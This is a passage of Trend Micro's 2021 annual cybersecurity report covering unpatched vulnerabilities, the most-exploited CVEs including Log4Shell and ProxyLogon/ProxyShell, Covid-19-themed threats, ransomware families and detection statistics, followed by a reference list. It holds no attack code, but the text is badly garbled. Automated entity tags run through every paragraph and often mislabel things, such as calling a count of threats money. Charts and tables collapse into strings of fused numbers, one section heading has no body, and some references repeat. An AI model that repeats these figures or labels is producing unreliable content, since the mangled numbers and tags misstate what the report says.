Our analysis suggests that more variants of this crypter tool , which continues to be updatedby its developers , will be introduced in the future , and these can contain even more RATs and have anupdated obfuscation algorithm to evade detection more effectively.19 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity [ORG] ReportRising [ORG] Vulnerabilities [ORG] Leave [ORG] Unpatched [ORG] Systems [ORG] Exposed to More RisksThe intricacies of modern IT infrastructures make patch management essential for business operations torun smoothly , but this is easier said than done : On average , it takes [DATE] 200 [DATE] days to fix a vulnerability , and [CARDINAL] 256days if the flaw is rated severe.67 In an ideal world , organizations routinely update the software they rely onand their own security policies . But this is a tall order for IT teams that are already spread thin , especiallybecause tracking updates is but one of their many everyday tasks.68Older [PERSON] Flaws [PERSON] Stay [PERSON] Relevant as [ORG] Malicious [ORG] Actors [ORG] Bank [ORG] on [ORG] Unprotected IT EnvironmentsIn 2021 , [ORG] Trend [ORG] Micro \u2122 [ORG] Zero [ORG] Day [ORG] Initiative \u2122 ( ZDI ) , a part of [ORG] Trend [ORG] Micro [ORG] Research , released advisorieson [CARDINAL] 1,604 vulnerabilities , which was [PERCENT] 10 % higher than the corresponding number from [DATE] the [DATE] previous [DATE] year . Among these , [DATE] 54 were rated with critical severity , a significant decrease from the [CARDINAL] 173 critical vulnerabilitiesof [DATE] 2020 . However , [DATE] 2021 did see an increase in those rated with high severity , rising to [CARDINAL] 1,138 from theprevious [DATE] year \u2019s [CARDINAL] 983.20 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity Report1,200983187 LowFigure 15 . A comparison of the proportions of [ORG] Common [ORG] Vulnerability [ORG] Scoring [ORG] System ( CVSS ) ratingsamong vulnerabilities disclosed by [ORG] Trend [ORG] Micro \u2019s [ORG] ZDI program in [DATE] 2020 and 2021Source : Trend Micro \u2122 Zero Day Initiative \u2122 Many legacy vulnerabilities have stayed in use , as there remains a demand for them in the undergroundexploit market . In fact , our [DATE] 2021 study found that [PERCENT] 22 % of the exploits sold in the underground were overthree [DATE] years old.69 Such exploits have been a reliable source of income for malicious actors , who can sellthem in underground forums , with prices starting at US$ [MONEY] 1,000.70Data from [ORG] Trend [ORG] Micro \u2122 TippingPoint \u00ae [ORG] Threat [ORG] Protection [ORG] System , a network security platform deployedat some of the largest organizations in the world , shows that malicious actors also exploited relativelynew vulnerabilities alongside older ones , with some dating as far back as [DATE] 2005 , despite the availabilityof patches for these flaws . There are familiar names in the list of vulnerabilities with the highest exploitcounts in [DATE] 2021 ; [CARDINAL] seven of these have been extensively abused by cybercriminals and have ranked amongthe most exploited flaws since [DATE] 2017.Far and away the highest number of exploit detections in [DATE] 2021 was of CVE-2019 [DATE] - 1225 , which amountedto over [CARDINAL] 75 [CARDINAL] million found by [ORG] Trend [ORG] Micro . CVE-2019 - 1225 is a memory disclosure flaw in [ORG] Microsoft\u2019sRemote [ORG] Desktop [ORG] Services that was disclosed in [DATE] August [DATE] 2019.71 Successful exploits of this vulnerabilityallow attackers to gather information that they can use to further compromise victims \u2019 systems . Comingin [ORDINAL] second was the critical vulnerability CVE-2017 - 14100 . Found in [PERSON] Asterisk , a software implementationof a private branch exchange from [ORG] Digium , this flaw accounted for [CARDINAL] more [CARDINAL] than [CARDINAL] 20 [CARDINAL] million detections in2021 . Exploits of this flaw , which was disclosed in [DATE] September [DATE] 2017 , allow unauthorized users to remotelyperform arbitrary shell command injections.7221 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity [ORG] ReportCVE [ORG] ID numberAffected productRule IDHitsCVE-2019 - 1225Windows RDP serverDV-3604275,267,406CVE-2017 - 14100Asterisk [CARDINAL] 11DV-2973920,846,194CVE-2011 - 1264Microsoft Windows ServerCVE-2010 - 0817Microsoft SharePoint serverDV-38864,831,951CVE-2014 - 6271CVE-2014 - 6277GNU BashDV-167981,860,228CVE-2014 - 6278CVE-2014 - 3567OpenSSLDV-170561,622,083CVE-2005 - 1380BEA Admin ConsoleCVE-2010 - 3936Microsoft [ORG] Forefront [ORG] Unified [ORG] Access GatewayCVE-2010 - 0817Microsoft SharePoint serverCVE-2017 - 0068Microsoft EdgeCVE-2003 [CARDINAL] - 1138ApacheCVE-2017 [CARDINAL] - 5638Apache StrutsCVE-2018 - 13379Fortinet FortiOSCVE-2018 - [CARDINAL] 10562Dasan GPON home routerDV-20231,054,890DV-11984DV-27410DV-36087DV-319361,032,998784,031631,799588,763Table [CARDINAL] 1 . The top vulnerabilities in terms of exploit detections in [CARDINAL] 2021Source : Trend Micro \u2122 TippingPoint \u00ae Threat Protection SystemLog4j [PERSON] Flaw [PERSON] Log4Shell Leads to [GPE] Exploit Outbreak2021 was peppered with noteworthy incidents that resulted from unpatched security gaps , such as thehigh - severity vulnerability CVE-2021 [ORG] - 44228 . [ORDINAL] First reported privately to [PRODUCT] Apache in [DATE] November [DATE] 202173 anddubbed [ORG] Log4Shell , this flaw affects [PRODUCT] Apache [PRODUCT] Log4j , a [PERSON] Java - based logging tool.74 Although the open - source [PRODUCT] Apache community had released a patch for it in [DATE] December , the vulnerability still led to a slewof exploits that malicious actors developed for a variety of illicit activities , including data theft , malwaredeployment , and unauthorized cryptocurrency mining or cryptojacking . Notably , the operators of [ORG] theKhonsari ransomware began using [FAC] Log4Shell in their attacks in [DATE] December [DATE] 2021.75Log4j is a widely used utility in both in - house and [ORDINAL] third - party applications for enterprises . Log4j\u2019sdependence on [PERSON] Java makes it difficult to detect when the tool is running across an enterprise\u2019senvironments . This explains why [PERSON] Log4Shell is not easily addressed , despite the availability of a patch . Log4Shell could allow attackers to send crafted log messages that execute arbitrary code , effectivelyweaponizing compromised machines to launch different kinds of attacks.22 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity ReportAs of [DATE] December [DATE] 2021 , [PERSON] Log4Shell affected [PERCENT] only 7 % of [ORG] Trend [ORG] Micro customers , scattered across [GPE] theAmericas , the [ORG] AMEA ( [LOC] Asia , [LOC] Middle [LOC] East , and [LOC] Africa ) region , [LOC] Europe , and [GPE] Japan , with the [GPE] US havingexperienced the highest number of incidents.76 Among our customers , the organizations most affected bythis vulnerability belonged to the government , retail , and manufacturing industries . [PERSON] Attackers [PERSON] Exploit [PERSON] ProxyLogon and [ORG] ProxyShell [ORG] FlawsOther prominent flaws that made waves in [DATE] 2021 included the [ORG] ProxyLogon and [ORG] ProxyShell vulnerabilities inMicrosoft [PERSON] Exchange [PERSON] Server , which were disclosed in [DATE] late [DATE] 2020 . [ORG] Microsoft released patches for ProxyLogon(CVE-2021 - 26855 ) in [DATE] March [DATE] 2021 and for the [ORG] ProxyShell vulnerabilities ( CVE-2021 [ORG] - 34473 and CVE-2021 [ORG] - 34523 ) in [DATE] May and July 2021.77 Despite the availability of patches , however , our telemetry showed thatProxyLogon had been part of many [DATE] 2021 attacks by different malware families , such as the [ORG] LemonDuckcryptocurrency miner , the [ORG] BlackKingdom ransomware , and the Prometei botnet malware.78In [DATE] September [DATE] 2021 , researchers reported on spam campaigns employing a new loader calledSquirrelwaffle.79 We found that these campaigns also used [ORG] ProxyLogon and [ORG] ProxyShell exploits in theirspam campaigns , and in doing so , they were able to send malicious emails posing as replies in existingemail threads to trick potential victims.80 In [DATE] November [DATE] 2021 , our investigation into [LOC] Squirrelwaffle intrusionsin [LOC] the [LOC] Middle [LOC] East showed that publicly available [ORG] ProxyLogon exploits were used to gain access to , searchthrough , and even download a victim \u2019s email messages . The [ORG] ProxyShell vulnerabilities were also abusedby Squirrelwaffle \u2019s operators to impersonate a local administrator , enabling them to perform [ORG] PowerShellcommands and deliver email replies containing a malicious [PRODUCT] Excel file.81Email withmalicious linkDownload \ufb01le with malicious macroExecute malicious script and download [ORG] DLL loaderCobal Strike orQbot C&CConnect toSquirrelwa\ufb04e C&CFigure [CARDINAL] 16 . The infection chain of the malicious [PRODUCT] Excel file in a [LOC] Squirrelwaffle spam email23 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual Cybersecurity ReportUnpatched VPN Vulnerabilities Threaten Promotion Agency , and [ORG] the [ORG] Japan [ORG] Computer [ORG] Emergency [ORG] Response [ORG] Team [ORG] Coordination Center25 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual Cybersecurity ReportPandemic - Related Threats Evolve and [ORG] Continue to Plague Remote WorkersThe Covid-19 pandemic has driven organizations to rethink their own operations . In the midst of it , manyhave adopted a hybrid work model that is dependent on remote connection and cloud computing toadapt to and stay afloat through the seismic changes it has precipitated.88 However , research showed thatin [DATE] 2021 , 72 % of organizations in the [GPE] US still struggled to defend themselves against attacks that aimed toinfiltrate their corporate networks through their employees \u2019 work - from - home setups.89Home offices had expanded the attack surfaces of enterprises , as demonstrated at [EVENT] Pwn2Own [EVENT] Austin2021 , a hacking competition organized by [ORG] Trend [ORG] Micro \u2019s [ORG] ZDI program.90 The event highlighted how theremote - working staples that many teleworkers relied on could be subjected to attacks . The participatingsecurity researchers carried out collision hacks on devices like printers , routers , and network - attachedstorage ( [ORG] NAS ) devices by using previously disclosed vulnerabilities or discovering new ones . Collectively , the participants at [FAC] Pwn2Own [FAC] Austin disclosed [CARDINAL] 61 new bugs.91Malicious actors have typically used the latest events and news stories in phishing attacks , but theseemails could be used only in the short term . The pandemic , though , has provided them with an abundanceof information around which they could theme their phishing emails . [DATE] Daily Covid-19 news coverage andupdates have given them a steady supply of guises that have helped them better tailor their techniquesto potential victims.92Throughout [DATE] 2021 , we observed various scams and malware attacks that used social engineering tacticsto entice potential victims into providing personal information . [CARDINAL] One trend was the increasing phishingattacks on the vaccine cold chain , likely because employees involved in any link of the chain had access tovaluable sensitive data . Another was the proliferation of fake mobile apps and websites that impersonatedgovernment entities , nongovernmental organizations , and companies involved in vaccine distribution , which malicious actors used to target people seeking aid , work opportunities , or more information onhow to acquire vaccines.93We detected [CARDINAL] more [CARDINAL] than [CARDINAL] 8 [CARDINAL] million threats related to Covid-19 in [DATE] 2021 , [CARDINAL] about [CARDINAL] half as many as those [DATE] inthe [DATE] previous [DATE] year . As in [DATE] 2020 , most of these threats were from the [GPE] US and [GPE] Germany , which were likelytargeted because of the important part they played in the cold chain as the base countries of majorvaccine researchers and manufacturers.26 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity [ORG] Report3,065,294US1,932,437463,221310,512222,634213,182209,595204,648197,661170,400GermanyColombiaUKItalyJapanMoroccoNetherlandsFranceBrazil0500K1.0M1.5M2.0M2.5M3.0M3.5MFigure 17 . The top [CARDINAL] 10 countries in terms of detections of Covid-19 - related threats in [CARDINAL] 2021Source : Trend Micro Smart Protection NetworkThreats that revolved around Covid-19 largely consisted of emails , which accounted for [PERCENT] 94 % of all ourCovid-19 - related threat detections in [DATE] 2021 ; these saw a 45 % year - on - year decrease over [DATE] 2020 . Therewas also a drop , of 82 % , in detected malicious URLs from [DATE] 2020 [DATE] to [DATE] 2021 . On the other hand , maliciousfiles more than quadrupled from [DATE] 2020 [DATE] to [DATE] 2021 ; most of these were detected in [GPE] Indonesia and [GPE] Brazil . EmailsURLsFiles14,503,9557,922,623 1,852,042325,27337,567156,2472020202103M6M9M12M15MFigure [CARDINAL] 18 . A comparison of the detections of Covid-19 - related threats , consisting of malicious emails , URLs , and files in [DATE] 2020 and 2021Source : Trend Micro Smart Protection Network27 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual Cybersecurity ReportPandemic - related threats in [DATE] 2021 peaked in [DATE] May , which was an eventful period for cybercrimes againstthe healthcare industry . In [DATE] that [DATE] month , [GPE] Ireland \u2019s public healthcare system , [ORG] the [ORG] Health [ORG] Service [ORG] Executive , fell victim to a debilitating [PERSON] Conti attack , resulting in the largest ever known cyberattack on a health servicecomputer system.94 Additionally , a [DATE] 2021 report showed that there were [CARDINAL] two or more data breaches in thehealthcare industry per day for [DATE] five [DATE] consecutive [DATE] months , from [DATE] March [DATE] to [DATE] July , which might account in partfor the substantial surge in Covid-19 - related threats in [DATE] May.95639,724447,705557,399660,4951,337,725766,344717,083799,419714,015673,906474,588615,740JANFEBMARAPRMAYJUNJULAUGSEPOCTNOVDEC0300K600K900K1.2M1.5MFigure [DATE] 19 . A [DATE] monthly comparison of the detections of Covid-19 - related threats in [CARDINAL] 2021Source : Trend Micro Smart Protection Network28 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity ReportIn 2021 , there was a 49 % year - on - year decline in Covid-19 - related threats , which could be explainedby different factors . Malicious actors might have been lying in wait for new pandemic - related trends andnews that they could abuse . However , these threats were concentrated in [CARDINAL] two countries , so cybercriminalinterest in Covid-19 - themed lures could have been waning elsewhere . While media consumption wasstrong in certain countries , especially in [LOC] Western [LOC] Europe , the same could not be said of countries whosemedia agencies were not as preoccupied with the Covid-19 crisis.96 Additionally , [TIME] the [TIME] working [TIME] hours lostbecause of widespread lockdowns were equivalent to [CARDINAL] 255 [CARDINAL] million full - time jobs in [CARDINAL] 2020,97 but that numberreceded to [CARDINAL] 125 [CARDINAL] million jobs [DATE] the [DATE] following [DATE] year , as more people returned to work after mass vaccinationrollouts and declines in Covid-19 cases.98 As the world gradually adjusted to this new normal and the labormarket made return - to - office plans , Covid-19 - themed threats began to lose their efficiency . Heightenedawareness of these threats might have also pushed more enterprises and individual users to employsoftware solutions that improved their security postures . Still , constant vigilance of scams surrounding the pandemic is necessary for all organizations if theyare to steer clear of costly losses . [ORG] The [ORG] World [ORG] Economic [ORG] Forum reports that since the pandemic began , cybercrime has evolved in step with the global digital economy : Organizations have had to fend off anaverage of [CARDINAL] 270 attacks each in [DATE] 2021 , and a single successful attack attempt can run up [MONEY] as [MONEY] much [MONEY] asUS$3.6 [MONEY] million in losses.9929 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity [ORG] ReportIncreasingly [ORG] Sophisticated [ORG] Threats [ORG] Call [ORG] for [ORG] Robust [ORG] and [ORG] Multilayered [ORG] Defense2021 was marked by attacks that grew in number and complexity , and whose repertoire of advancedtools and techniques underscored the necessity of a more strategic , risk - focused approach to security . [GPE] Sudden shifts in business operations , like the mass migration to remote work and a growing dependenceon online environments , brought about a shift in the attack surface and a multitude of security gaps thatmalicious actors were only too eager to exploit . Companies had grown more reliant on technologies likethe internet of things ( [ORG] IoT ) and added more connected devices to their corporate network , which in turnwidened their attack surfaces.100The changing face of cybercrime means that conventional defense practices are no longer as effective asthey once were . An organization needs to focus on managing risk throughout the life cycle of its attacksurface , with a focus on discovering an ever - changing attack surface , assessing risk , and then mitigatingthat risk . This enables the organization to ensure a secure working environment for its physical offices andbe on the lookout for threats that can undermine its virtual workspaces as well . [DATE] Modern [DATE] - [DATE] day distributedworkforces do not access company resources the way they did on - premises , and the security needs ofenterprises across the board have outgrown the password - based authentication processes that werebuilt on binary login scenarios.101New security paradigms like [CARDINAL] zero trust , which assumes that attackers exist both within and outside asystem , are more suited to managing transformed attack surfaces . This is not achieved by any oneproduct ; [CARDINAL] zero - trust environments are governed by a philosophy of constant validation and monitoring , sothe trustworthiness of every device and user is properly assessed before any device or user is grantedpermissions to any company resource . By practicing stringent access management policies that aregrounded in [CARDINAL] zero trust , organizations can be better equipped to protect themselves against attackersattempting credential dumping to access their systems or steal their sensitive data.102Investments in advanced security technologies should not be the sole focus of an organization \u2019s defensestrategy . These also need to be paired with policies that can stand up to increasingly elaborate scams andlures that elevate overall risk . The social engineering tactics and human errors that have allowed attacksto make inroads [DATE] year after year stress the crucial role that individual users play in a company \u2019s securityprofile . A workforce that has access to the resources it needs to stay alert and well - informed of potentialthreats can help cut off potential entry points for attackers.30 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity [ORG] ReportSince the pandemic started , the need to secure at - home work setups has also put additional strain oncybersecurity teams , [PERCENT] 61 % of which are already understaffed,103 as the shift to hybrid work arrangementshas added to the complexity of enterprise networks and left security personnel scrambling to assistremote employees . Until this talent gap can be addressed , organizations should work alongside securityvendors to automate processes and provide advanced analytics to lessen the load on their overworkedcybersecurity workforce.104Companies need security solutions that can assist in the discovery , assessment , and mitigation ofpersistent and emerging risks across the enterprise . It is important for enterprises to understand theirgrowing attack surfaces to determine the security risks of their digital assets if they are to stay agileand adapt quickly to a changing threat landscape . Discovering the ways in which their attack surfacesare continuously changing and expanding will help enterprises gain the insights they need to accuratelyassess and apply the right security solutions to thwart threats . However , this is beyond the capability of siloed tools or any single layer of protection . To manage the riskof evolving threats , decision - makers need to derive insights from high - quality data . As more organizationsundergo digital transformations , they come up against the daunting task of breaking down data silos , which are usually borne of business units that are accustomed to collecting information separately and ofsiloed technology and legacy systems built over time as companies grow.105Data gathered in silos from different products makes it a challenge for organizations to act on securityincidents swiftly . Without a means to correlate all this information , security leaders are left to piece togetherdifferent perspectives of an attack , often with varying levels of detail , from different technologies.106 Havingsolutions in place that can assess , cross - check , and consolidate output from systems helps centralizedata and results in a more detailed picture of an organization \u2019s risk posture . On top of the complex threats bearing down on organizations , they also must keep pace with the risingnumber of data privacy and security compliance rules . However , [PERCENT] only [PERCENT] 4 % of a compliance officer \u2019s timegoes toward actually updating policies or implementing new measures to stay abreast of regulatorydevelopments , whereas 26 % of their time on the job is spent liaising with different teams within theirorganization.107 A compliance team should be able to access accurate reporting of its [GPE] company\u2019sIT infrastructure if it is to be more agile and productive , instead of having to interface with differentdepartments to manually collect the information it needs . Organizations can put themselves in a better position to map out their expanding attack surfaces byemploying a unified cybersecurity platform that can monitor and address the different needs of theirendpoint , email , network , and cloud environments simultaneously . In doing so , they can achievetransparency over the goings - on in their entire digital ecosystems , anticipate new threats , and plancountermeasures accordingly.31 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual Cybersecurity ReportThe Threat Landscape in BriefIn [DATE] 2021 , [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network , including [ORG] Mobile [ORG] App [ORG] Reputation [ORG] Service , [ORG] IoT [ORG] ReputationService , and [ORG] Smart [ORG] Home [ORG] Network , protected [ORG] Trend [ORG] Micro customers from [MONEY] more [MONEY] than [MONEY] 94 [MONEY] billion threats . Our year - on - year data shows an increase in blocked threats and reputation queries across most metricscompared to [DATE] 2020 , most notable of which is the substantial 382 % spike in blocked malicious files.94,289,585,240Overall blocked threats in [CARDINAL] 202157,262,610,93069,869,979,425Blocked email threats202020211,676,675,1943,468,559,504Blocked malicious URLs3,698,445,87117,834,808,438Blocked malicious \ufb01les020B40B60B80B0500 M 1B1.5B2B2.5B3B3.5B05B10B15B20B79,743,156,63789,032,192,911Email reputation queries2,338,754,688,0443,353,131,929,834URL reputation queries1,523,957,334,5141,920,529,076,114File reputation queries020B40B60B80B100B0500B1.5T2.5T3.5T0500B1T1.5T2T35,156,91737,088,836Blocked mobile app threats4,618,4605,921,414Blocked IoT threats3,818,082,7563,073,227,623Blocked threats010M20M30M40M02M4M6M01B2B3B4BFigure [CARDINAL] 20 . A comparison of the numbers of blocked email , URL , and file threats , of email , URL , and file reputation queries , and of blocked mobile app , [ORG] IoT , and [ORG] Smart [ORG] Home [ORG] Network threats in [DATE] 2020 and 2021Source : Trend Micro Smart Protection Network , including [ORG] Mobile [ORG] App [ORG] Reputation [ORG] Service , [ORG] IoTReputation [ORG] Service , and [ORG] Smart [ORG] Home Network32 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity ReportThe malware families that dominated the threat landscape of [DATE] 2021 were led by cryptocurrency miners , followed closely by web shells and the trojan [ORG] Ulise . [ORG] WannaCry , which topped the list in [DATE] 2020 , continuedto be the only ransomware among them . We detected [CARDINAL] 78 new ransomware families in [DATE] 2021 , a 39 % year - on - year decrease.150,909149,290145,32197,58571,32866,14959,78354,88550,71245,245CoinminerWebshellUliseWannaCryDownadNemucodDLoaderSalityPowloadGamarue050K100K150K200KFigure 21 . The top [CARDINAL] 10 malware families in terms of detections in [CARDINAL] 2021Source : Trend Micro Smart Protection Network12778202020210306090120150Figure [CARDINAL] 22 . A comparison of the detections of new ransomware families in [DATE] 2020 and 2021Source : Trend Micro Smart Protection Network33 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual Cybersecurity ReportJanFebMarAprMayJunAmjixiusSophCryptIziCryptCryngTrojanLockVoidCryptNitroSharpCrypterHDLockerHogLockerAstroLockerCicadaSickRansomOnCryptHantaVenusHadesQLockerBabukFakeRyukLegionLockerBlackHoleApostriusDarkRadiationLuciferButwoFlamingoCNHCryptDadiCryptAssistHelpYouThunderCryptGangBangDarkWorldWhiteBlackCryptFiveHandsGonnaCryptTaihenchanNetwormNoCryCrysis . TibgghBlueCrabJudgeMijnalNamasteGunshotGaryTestMolochPsixtinJulAugSepOctNovDecGriefGoFiveRedDotHKittyEpsiredRansomartKCryPolarisSplinjokLokiLockerQuantumLockerBlackCatTimeCryptHQCryptColossusRookHiveCyratCalCryptDiavolSanwaiAvosLockerAtomSiloBlackMatterMorrisCryptLockFileRantuChaosBuilderChaosTable [CARDINAL] 3 . The new ransomware families detected in [CARDINAL] 2021Source : Trend Micro Smart Protection Network34 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity ReportIn 2021 , there was a [PERCENT] 14 % year - on - year increase in mobile device \u2013 related malicious samples . There wasalso an uptick in the number of blocked [ORG] Android mobile apps , which were [PERCENT] 5 % more than in the previousyear.7,880,0488,962,1722020202102M4M6M8M10MFigure [CARDINAL] 23 . A comparison of the detections of mobile device \u2013 related malicious samples in [DATE] 2020 and 2021Source : Trend Micro Mobile App Reputation Service35,156,91737,088,83620202021010M20M30M40MFigure 24 . A comparison of the numbers of blocked malicious [ORG] Android apps in [DATE] 2020 and 2021Source : Trend Micro Mobile App Reputation Service35 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual [ORG] Cybersecurity [ORG] ReportReferences1 [ORG] Trend [ORG] Micro . ( [DATE] Dec. [DATE] 20 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Ransomware Spotlight : REvil . \u201d Accessed on [DATE] Jan. [DATE] 28 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Dec. [DATE] 1 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Ransomware Spotlight : [PERSON] Conti . \u201d Accessed on [DATE] Jan. [DATE] 28 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Nov. [DATE] 10 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [PERSON] Void [PERSON] Balaur and [PERSON] the [PERSON] Rise [PERSON] of [PERSON] the [PERSON] Cybermercenary [PERSON] Industry . \u201d Accessed on [DATE] Jan. [DATE] 29,2022 , at url [PERSON] Nick [PERSON] Dai , [PERSON] Ted [PERSON] Lee , and [PERSON] Vickie [PERSON] Su . ( [DATE] Dec. [DATE] 14 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201d Collecting In the Dark : Tropic Trooper Targets Transportationand Government . \u201d Accessed on [DATE] Jan. 29 , [DATE] 2022 , at url tropic - trooper - targets - transportation - and - government - organizations.html.5 Mohamed Fahmy , [PERSON] Sherif [PERSON] Magdy and [PERSON] Abdelrhman [PERSON] Sharshar . ( [DATE] Nov. [DATE] 19 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Squirrelwaffle [WORK_OF_ART] Exploits [WORK_OF_ART] ProxyShell and [ORG] ProxyLogon to Hijack Email Chains . \u201d Accessed on [DATE] Jan. [DATE] 28 , [DATE] 2022 , at url [LOC] Squirrelwaffle [LOC] - [LOC] Exploits [LOC] - ProxyShell - and - ProxyLogon - to - Hijack - Email - Chains.html.6 [PERSON] Ranga [PERSON] Duraisamy , [PERSON] Ashish [PERSON] Verma , [PERSON] Miguel [PERSON] Carlo [PERSON] Ang , and [LOC] Nitesh [LOC] Surana . ( [DATE] Dec. [DATE] 13 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Patch [WORK_OF_ART] Now : [ORG] Apache [ORG] Log4j [ORG] Vulnerability [ORG] Called [ORG] Log4Shell [ORG] Actively [ORG] Exploited . \u201d Accessed on [DATE] Jan. 29 , [DATE] 2022 , at url research/21 / l / patch - now - apache - log4j - vulnerability - called - log4shell - being - acti.html.7 Trend Micro . ( [DATE] Aug. [DATE] 28 , [DATE] 2018 ) . [ORG] Trend [ORG] Micro . \u201c [ORG] Trend [ORG] Micro [ORG] Report [ORG] Reveals [ORG] Criminals [ORG] Increasingly [ORG] Drawn To Low - Profile Attacks . \u201dAccessed on [DATE] Feb. [DATE] 22 , [DATE] 2022 , at url Increasingly - Drawn - To - Low - Profile - Attacks.8 [PERSON] David [PERSON] Sancho . ( [DATE] Jan. [DATE] 30 , [DATE] 2018 ) . [ORG] Trend [ORG] Micro . \u201c Digital Extortion : A Forward - looking View . \u201d Accessed on [DATE] Feb. [DATE] 22 , [DATE] 2022 , aturl [ORG] Trend [ORG] Micro . ( [DATE] June [DATE] 8 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Modern [WORK_OF_ART] Ransomware \u2019s [WORK_OF_ART] Double [WORK_OF_ART] Extortion [WORK_OF_ART] Tactics and How to Protect Enterprises Against Them . \u201d Accessed on [DATE] Jan. [DATE] 30 , [DATE] 2022 , at url threats / modern - ransomwares - double - extortion - tactics - and - how - to - protect - enterprises - against - them.10 [PERSON] Puja [PERSON] Mahendru . ( [DATE] May 17 , [DATE] 2021 ) . Sophos . \u201c [WORK_OF_ART] The [WORK_OF_ART] State [WORK_OF_ART] of [WORK_OF_ART] Ransomware in [ORG] Healthcare [DATE] 2021 . \u201d Accessed on [DATE] Feb. [DATE] 21 , [DATE] 2022 , aturl [PERSON] Stephane [PERSON] Duguin . ( [DATE] Nov. [DATE] 8 , [DATE] 2021 ) . World Economic Forum . \u201c If healthcare does n\u2019t strengthen its cybersecurity , it could soon bein critical condition . \u201d Accessed on [DATE] Feb. [DATE] 22 , [DATE] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Nov. [DATE] 23 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Examining Erratic Modern Ransomware Activities . \u201d Accessed on [DATE] Jan. [DATE] 30,2022 , at url ransomwareactivities - ransomware - in - q3 - 2021.13 [PERSON] Abraham [PERSON] Camba , [PERSON] Catherine [PERSON] Loveria , [PERSON] Ryan [PERSON] Maglaque , and [ORG] Buddy [ORG] Tancio . ( [DATE] July [DATE] 5 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Tracking [WORK_OF_ART] Cobalt [WORK_OF_ART] Strike : [WORK_OF_ART] A [WORK_OF_ART] Trend [WORK_OF_ART] Micro [WORK_OF_ART] Vision [WORK_OF_ART] One [WORK_OF_ART] Investigation . \u201d Accessed on [DATE] March [DATE] 11 , [DATE] 2022 , at url [ORG] tracking_cobalt_strike_a_vision_one_investigation.html.14 [ORG] Trend [ORG] Micro . ( [DATE] Dec. [DATE] 1 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Ransomware Spotlight : [WORK_OF_ART] Conti \u201d [WORK_OF_ART] Accessed [WORK_OF_ART] on [WORK_OF_ART] March [WORK_OF_ART] 11 , [WORK_OF_ART] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Nov. [DATE] 4 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Ryuk 2020 : Distributing Ransomware via [ORG] TrickBot and [ORG] BazarLoader . \u201d [GPE] Accessedon [DATE] March [DATE] 11 , [DATE] 2022 , at url distributing - ransomware - via - trickbot - and - bazarloader.16 Trend Micro . ( [DATE] Dec. [DATE] 1 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Ransomware Spotlight : [WORK_OF_ART] Conti \u201d [WORK_OF_ART] Accessed [WORK_OF_ART] on [WORK_OF_ART] March [WORK_OF_ART] 11 , [WORK_OF_ART] 2022 , at url [ORG] Trend [ORG] Micro . ( [DATE] Nov. [DATE] 4 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Ryuk 2020 : Distributing Ransomware via [ORG] TrickBot and [ORG] BazarLoader . \u201d [GPE] Accessedon [DATE] March [DATE] 11 , [DATE] 2022 , at url distributing - ransomware - via - trickbot - and - bazarloader.18 Trend Micro . ( [DATE] Sept. 7 , [DATE] 2016 ) . [ORG] Trend [ORG] Micro . \u201c Ransomware as a Service Offered in the Deep Web : What This Means forEnterprises . \u201d Accessed on [DATE] Jan. 25 , [DATE] 2022 , at url threats / ransomware - as - a - service - what - this - means - for - enterprises.36 | Navigating New Frontiers : Trend Micro [DATE] 2021 Annual Cybersecurity [CARDINAL] Report19 Fyodor Yarochkin . ( [DATE] Oct. [DATE] 5 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Ransomware as a Service : Enabler of Widespread Attacks . \u201d Accessed on Jan.25 , [DATE] 2022 , at url enabler - of - widespread - attacks.20 Trend Micro . ( [DATE] Nov. [DATE] 30 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Investigating the Emerging Access - as - a - Service Market . \u201d Accessed on [DATE] Feb. [DATE] 22,2022 , at url access - as - a - service - market.21 [PERSON] Janus [PERSON] Agcaoili , [PERSON] Miguel [PERSON] Ang , [PERSON] Earle [PERSON] Earnshaw , [PERSON] Byron [PERSON] Gelera , and [ORG] Nikko [ORG] Tama\u00f1a . ( [DATE] June 15 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Ransomware [WORK_OF_ART] Double [WORK_OF_ART] Extortion [WORK_OF_ART] and [WORK_OF_ART] Beyond : REvil , [PERSON] Clop , and [PERSON] 